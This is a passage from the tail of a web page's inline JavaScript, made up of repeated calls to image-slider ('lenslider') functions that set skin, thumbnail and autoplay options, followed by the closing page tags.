slider_random":0,"ls_banner_width":2400,"ls_banner_height":0,"ls_slider_disen":1,"ls_slider_skin":"nemo_target","banners_disen":[1,1,1],"ls_images_maxwidth":15},"thumbs":{"ls_has_thumb":0,"ls_thumb_max_width":50},"slideshow":{"ls_has_autoplay":0,"ls_autoplay_delay":20000,"ls_autoplay_hover_pause":0,"ls_easing_effect":"linear"}});vania_fit_lenslider_fn({"skin":{"ls_slider_comment":"La Cucina","ls_slider_random":0,"ls_banner_width":2400,"ls_banner_height":0,"ls_slider_disen":1,"ls_slider_skin":"dares_serpent","banners_disen":[1],"ls_images_maxwidth":10},"thumbs":{"ls_has_thumb":0,"ls_thumb_max_width":300},"slideshow":{"ls_has_autoplay":1,"ls_autoplay_delay":20000,"ls_autoplay_hover_pause":0,"ls_easing_effect":"linear"}});vania_fit_lenslider_fn({"skin":{"ls_slider_comment":"","ls_slider_random":0,"ls_banner_width":2400,"ls_banner_height":0,"ls_slider_disen":1,"ls_slider_skin":"vania_fit","banners_disen":[1],"ls_images_maxwidth":1},"thumbs":{"ls_has_thumb":0,"ls_thumb_max_width":300},"slideshow":{"ls_has_autoplay":0,"ls_autoplay_delay":20000,"ls_autoplay_hover_pause":0,"ls_easing_effect":"linear"}});vania_fit_lenslider_fn({"skin":{"ls_slider_comment":"","ls_slider_random":0,"ls_banner_width":2400,"ls_banner_height":0,"ls_slider_disen":1,"ls_slider_skin":"smart_energy","banners_disen":[1,1],"ls_images_maxwidth":1},"thumbs":{"ls_has_thumb":1,"ls_thumb_max_width":50},"slideshow":{"ls_has_autoplay":0,"ls_autoplay_delay":20000,"ls_autoplay_hover_pause":0,"ls_easing_effect":"linear"}});vania_fit_lenslider_fn({"skin":{"ls_slider_comment":"","ls_slider_random":0,"ls_banner_width":2400,"ls_banner_height":0,"ls_slider_disen":1,"ls_slider_skin":"nemo_target","banners_disen":[1,1,1],"ls_images_maxwidth":15},"thumbs":{"ls_has_thumb":0,"ls_thumb_max_width":50},"slideshow":{"ls_has_autoplay":0,"ls_autoplay_delay":20000,"ls_autoplay_hover_pause":0,"ls_easing_effect":"linear"}});smart_energy_lenslider_fn({"skin":{"ls_slider_comment":"La Cucina","ls_slider_random":0,"ls_banner_width":2400,"ls_banner_height":0,"ls_slider_disen":1,"ls_slider_skin":"dares_serpent","banners_disen":[1],"ls_images_maxwidth":10},"thumbs":{"ls_has_thumb":0,"ls_thumb_max_width":300},"slideshow":{"ls_has_autoplay":1,"ls_autoplay_delay":20000,"ls_autoplay_hover_pause":0,"ls_easing_effect":"linear"}});smart_energy_lenslider_fn({"skin":{"ls_slider_comment":"","ls_slider_random":0,"ls_banner_width":2400,"ls_banner_height":0,"ls_slider_disen":1,"ls_slider_skin":"vania_fit","banners_disen":[1],"ls_images_maxwidth":1},"thumbs":{"ls_has_thumb":0,"ls_thumb_max_width":300},"slideshow":{"ls_has_autoplay":0,"ls_autoplay_delay":20000,"ls_autoplay_hover_pause":0,"ls_easing_effect":"linear"}});smart_energy_lenslider_fn({"skin":{"ls_slider_comment":"","ls_slider_random":0,"ls_banner_width":2400,"ls_banner_height":0,"ls_slider_disen":1,"ls_slider_skin":"smart_energy","banners_disen":[1,1],"ls_images_maxwidth":1},"thumbs":{"ls_has_thumb":1,"ls_thumb_max_width":50},"slideshow":{"ls_has_autoplay":0,"ls_autoplay_delay":20000,"ls_autoplay_hover_pause":0,"ls_easing_effect":"linear"}});smart_energy_lenslider_fn({"skin":{"ls_slider_comment":"","ls_slider_random":0,"ls_banner_width":2400,"ls_banner_height":0,"ls_slider_disen":1,"ls_slider_skin":"nemo_target","banners_disen":[1,1,1],"ls_images_maxwidth":15},"thumbs":{"ls_has_thumb":0,"ls_thumb_max_width":50},"slideshow":{"ls_has_autoplay":0,"ls_autoplay_delay":20000,"ls_autoplay_hover_pause":0,"ls_easing_effect":"linear"}});nemo_target_lenslider_fn({"skin":{"ls_slider_comment":"La Cucina","ls_slider_random":0,"ls_banner_width":2400,"ls_banner_height":0,"ls_slider_disen":1,"ls_slider_skin":"dares_serpent","banners_disen":[1],"ls_images_maxwidth":10},"thumbs":{"ls_has_thumb":0,"ls_thumb_max_width":300},"slideshow":{"ls_has_autoplay":1,"ls_autoplay_delay":20000,"ls_autoplay_hover_pause":0,"ls_easing_effect":"linear"}});nemo_target_lenslider_fn({"skin":{"ls_slider_comment":"","ls_slider_random":0,"ls_banner_width":2400,"ls_banner_height":0,"ls_slider_disen":1,"ls_slider_skin":"vania_fit","banners_disen":[1],"ls_images_maxwidth":1},"thumbs":{"ls_has_thumb":0,"ls_thumb_max_width":300},"slideshow":{"ls_has_autoplay":0,"ls_autoplay_delay":20000,"ls_autoplay_hover_pause":0,"ls_easing_effect":"linear"}});nemo_target_lenslider_fn({"skin":{"ls_slider_comment":"","ls_slider_random":0,"ls_banner_width":2400,"ls_banner_height":0,"ls_slider_disen":1,"ls_slider_skin":"smart_energy","banners_disen":[1,1],"ls_images_maxwidth":1},"thumbs":{"ls_has_thumb":1,"ls_thumb_max_width":50},"slideshow":{"ls_has_autoplay":0,"ls_autoplay_delay":20000,"ls_autoplay_hover_pause":0,"ls_easing_effect":"linear"}});nemo_target_lenslider_fn({"skin":{"ls_slider_comment":"","ls_slider_random":0,"ls_banner_width":2400,"ls_banner_height":0,"ls_slider_disen":1,"ls_slider_skin":"nemo_target","banners_disen":[1,1,1],"ls_images_maxwidth":15},"thumbs":{"ls_has_thumb":0,"ls_thumb_max_width":50},"slideshow":{"ls_has_autoplay":0,"ls_autoplay_delay":20000,"ls_autoplay_hover_pause":0,"ls_easing_effect":"linear"}});});</script></body>
+</html>
